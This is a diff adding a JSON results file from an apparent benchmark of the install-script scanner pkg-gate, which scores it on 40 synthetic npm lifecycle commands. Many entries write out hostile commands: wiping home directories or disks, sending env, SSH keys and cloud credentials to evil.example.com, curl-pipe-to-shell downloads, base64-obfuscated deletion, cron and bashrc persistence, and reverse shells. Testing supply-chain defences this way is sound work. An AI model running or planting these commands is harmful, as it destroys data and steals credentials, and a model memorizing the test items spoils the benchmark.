@@ -1,0 +1,489 @@
+{
+  "group": "install-scripts",
+  "date": "2026-10-31",
+  "scope": "directo: se ejecuta el CLI de cada puerta, sin pasar por el hub de jevalan",
+  "environment": {
+    "node": "v24.8.0",
+    "keys": "ninguna: entorno vacío, HOME y cwd propios; ninguna puerta puede llamar a un modelo"
+  },
+  "corpus": {
+    "size": 40
+  },
+  "not_measured": [
+    "cualquier decisión que dependa de un modelo: sin clave, estas puertas usan su motor local",
+    "paquetes reales: son scripts sintéticos de una sola línea dentro de un manifiesto",
+    "el código del paquete: solo se juzgan los scripts de ciclo de vida, no lo que un `require` ejecute después",
+    "resolver un nombre de paquete contra el registro de npm"
+  ],
+  "projects": {
+    "hemanth/pkg-gate": {
+      "version": "0.2.0",
+      "summary": {
+        "byTechnique": {
+          "direct-destructive": {
+            "total": 6,
+            "bypass": 6
+          },
+          "exfiltration": {
+            "total": 7,
+            "bypass": 1,
+            "held": 6
+          },
+          "download-exec": {
+            "total": 6,
+            "held": 3,
+            "bypass": 3
+          },
+          "obfuscation": {
+            "total": 5,
+            "bypass": 4,
+            "held": 1
+          },
+          "persistence": {
+            "total": 5,
+            "held": 3,
+            "bypass": 2
+          },
+          "lookalike-safe": {
+            "total": 11,
+            "useful": 8,
+            "false-block": 2,
+            "friction": 1
+          }
+        },
+        "dangerByTechnique": {
+          "direct-destructive": {
+            "allow": 6
+          },
+          "exfiltration": {
+            "allow": 1,
+            "block": 6
+          },
+          "download-exec": {
+            "block": 3,
+            "allow": 3
+          },
+          "obfuscation": {
+            "allow": 4,
+            "block": 1
+          },
+          "persistence": {
+            "block": 3,
+            "allow": 2
+          }
+        },
+        "bypasses": 16,
+        "blocked": 13,
+        "asked": 0,
+        "dangerTotal": 29,
+        "unreadable": 0,
+        "useful": 8,
+        "friction": 1,
+        "falseBlocks": 2,
+        "safeTotal": 11
+      },
+      "results": [
+        {
+          "id": "rm-home",
+          "technique": "direct-destructive",
+          "truth": "danger",
+          "cmd": "rm -rf $HOME",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "rm-tilde",
+          "technique": "direct-destructive",
+          "truth": "danger",
+          "cmd": "rm -rf ~",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "rm-root",
+          "technique": "direct-destructive",
+          "truth": "danger",
+          "cmd": "rm -rf /",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "dd-disk",
+          "technique": "direct-destructive",
+          "truth": "danger",
+          "cmd": "dd if=/dev/zero of=/dev/sda bs=1M",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "find-delete-home",
+          "technique": "direct-destructive",
+          "truth": "danger",
+          "cmd": "find ~ -type f -delete",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "node-rmsync-home",
+          "technique": "direct-destructive",
+          "truth": "danger",
+          "cmd": "node -e \"require('fs').rmSync(require('os').homedir(), {recursive: true, force: true})\"",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "env-to-curl",
+          "technique": "exfiltration",
+          "truth": "danger",
+          "cmd": "curl -d \"$(env)\" https://evil.example.com/collect",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "printenv-post",
+          "technique": "exfiltration",
+          "truth": "danger",
+          "cmd": "printenv | curl -X POST --data-binary @- https://evil.example.com",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "held",
+          "reason": "[postinstall] Probable credential access (96% probability)"
+        },
+        {
+          "id": "ssh-key-nc",
+          "technique": "exfiltration",
+          "truth": "danger",
+          "cmd": "cat ~/.ssh/id_rsa | nc evil.example.com 4444",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "held",
+          "reason": "[postinstall] Probable credential access (96% probability)"
+        },
+        {
+          "id": "npmrc-curl",
+          "technique": "exfiltration",
+          "truth": "danger",
+          "cmd": "cat ~/.npmrc | curl -d @- https://evil.example.com",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "held",
+          "reason": "[postinstall] Probable credential access (96% probability)"
+        },
+        {
+          "id": "aws-scp",
+          "technique": "exfiltration",
+          "truth": "danger",
+          "cmd": "scp ~/.aws/credentials attacker@evil.example.com:/tmp/",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "held",
+          "reason": "[postinstall] Probable credential access (96% probability)"
+        },
+        {
+          "id": "tar-ssh-curl",
+          "technique": "exfiltration",
+          "truth": "danger",
+          "cmd": "tar czf - ~/.ssh | curl -T - https://evil.example.com/up",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "held",
+          "reason": "[postinstall] Probable credential access (96% probability)"
+        },
+        {
+          "id": "node-token-get",
+          "technique": "exfiltration",
+          "truth": "danger",
+          "cmd": "node -e \"require('https').get('https://evil.example.com/?t=' + process.env.NPM_TOKEN)\"",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "held",
+          "reason": "[postinstall] Probable credential access (96% probability)"
+        },
+        {
+          "id": "curl-pipe-sh",
+          "technique": "download-exec",
+          "truth": "danger",
+          "cmd": "curl https://evil.example.com/x.sh | sh",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "held",
+          "reason": "[postinstall] Probable credential access (40% probability)"
+        },
+        {
+          "id": "wget-pipe-bash",
+          "technique": "download-exec",
+          "truth": "danger",
+          "cmd": "wget -qO- https://evil.example.com/x.sh | bash",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "held",
+          "reason": "[postinstall] Probable credential access (40% probability)"
+        },
+        {
+          "id": "curl-pipe-no-spaces",
+          "technique": "download-exec",
+          "truth": "danger",
+          "cmd": "curl -s https://evil.example.com/x.sh|sh",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "held",
+          "reason": "[postinstall] Probable credential access (40% probability)"
+        },
+        {
+          "id": "download-chmod-run",
+          "technique": "download-exec",
+          "truth": "danger",
+          "cmd": "curl -o /tmp/x https://evil.example.com/x && chmod +x /tmp/x && /tmp/x",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "powershell-iex",
+          "technique": "download-exec",
+          "truth": "danger",
+          "cmd": "powershell -c \"iex (iwr https://evil.example.com/x.ps1)\"",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "python-exec-urlopen",
+          "technique": "download-exec",
+          "truth": "danger",
+          "cmd": "python3 -c \"import urllib.request as u; exec(u.urlopen('https://evil.example.com/x').read())\"",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "base64-pipe-sh",
+          "technique": "obfuscation",
+          "truth": "danger",
+          "cmd": "echo cm0gLXJmIH4= | base64 -d | sh",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "node-eval-buffer",
+          "technique": "obfuscation",
+          "truth": "danger",
+          "cmd": "node -e \"eval(Buffer.from('cm0gLXJmIH4=', 'base64').toString())\"",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "held",
+          "reason": "[postinstall] Probable credential access (40% probability)"
+        },
+        {
+          "id": "bash-c-base64",
+          "technique": "obfuscation",
+          "truth": "danger",
+          "cmd": "bash -c \"$(echo cm0gLXJmIH4= | base64 -d)\"",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "variable-indirection",
+          "technique": "obfuscation",
+          "truth": "danger",
+          "cmd": "a=rm; $a -rf ~",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "quote-splitting",
+          "technique": "obfuscation",
+          "truth": "danger",
+          "cmd": "r\"\"m -rf ~",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "bashrc-append",
+          "technique": "persistence",
+          "truth": "danger",
+          "cmd": "echo 'curl https://evil.example.com/x.sh | sh' >> ~/.bashrc",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "held",
+          "reason": "[postinstall] Probable credential access (40% probability)"
+        },
+        {
+          "id": "crontab-beacon",
+          "technique": "persistence",
+          "truth": "danger",
+          "cmd": "(crontab -l; echo '* * * * * curl https://evil.example.com | sh') | crontab -",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "held",
+          "reason": "[postinstall] Probable credential access (40% probability)"
+        },
+        {
+          "id": "nc-reverse-shell",
+          "technique": "persistence",
+          "truth": "danger",
+          "cmd": "nc -e /bin/sh evil.example.com 4444",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "dev-tcp-shell",
+          "technique": "persistence",
+          "truth": "danger",
+          "cmd": "bash -i >& /dev/tcp/evil.example.com/4444 0>&1",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "bypass",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "authorized-keys",
+          "technique": "persistence",
+          "truth": "danger",
+          "cmd": "echo 'ssh-rsa AAAAB3 attacker@evil' >> ~/.ssh/authorized_keys",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "held",
+          "reason": "[postinstall] Probable credential access (96% probability)"
+        },
+        {
+          "id": "node-gyp",
+          "technique": "lookalike-safe",
+          "truth": "safe",
+          "cmd": "node-gyp rebuild",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "useful",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "tsc",
+          "technique": "lookalike-safe",
+          "truth": "safe",
+          "cmd": "tsc",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "useful",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "prebuild-fallback",
+          "technique": "lookalike-safe",
+          "truth": "safe",
+          "cmd": "prebuild-install || node-gyp rebuild",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "useful",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "husky",
+          "technique": "lookalike-safe",
+          "truth": "safe",
+          "cmd": "husky install",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "useful",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "patch-package",
+          "technique": "lookalike-safe",
+          "truth": "safe",
+          "cmd": "patch-package",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "useful",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "npm-run-build",
+          "technique": "lookalike-safe",
+          "truth": "safe",
+          "cmd": "npm run build",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "useful",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "thanks-banner",
+          "technique": "lookalike-safe",
+          "truth": "safe",
+          "cmd": "echo \"Thanks for installing!\"",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "useful",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        },
+        {
+          "id": "skip-in-ci",
+          "technique": "lookalike-safe",
+          "truth": "safe",
+          "cmd": "node -e \"if (process.env.CI) process.exit(0)\"",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "false-block",
+          "reason": "[postinstall] Probable credential access (96% probability)"
+        },
+        {
+          "id": "echo-uname-hint",
+          "technique": "lookalike-safe",
+          "truth": "safe",
+          "cmd": "echo \"If the build fails, run uname -a and report it\"",
+          "raw": "warn",
+          "decision": "ask",
+          "outcome": "friction",
+          "reason": "[postinstall] Probable credential access (55% probability)"
+        },
+        {
+          "id": "echo-pipe-warning",
+          "technique": "lookalike-safe",
+          "truth": "safe",
+          "cmd": "echo \"never run curl https://example.com/x.sh | bash\"",
+          "raw": "block",
+          "decision": "block",
+          "outcome": "false-block",
+          "reason": "[postinstall] Probable credential access (40% probability)"
+        },
+        {
+          "id": "rm-dist",
+          "technique": "lookalike-safe",
+          "truth": "safe",
+          "cmd": "rm -rf dist",
+          "raw": "allow",
+          "decision": "allow",
+          "outcome": "useful",
+          "reason": "Lifecycle scripts verified benign (standard build or verified binary)"
+        }
+      ]
+    }
+  }
+}
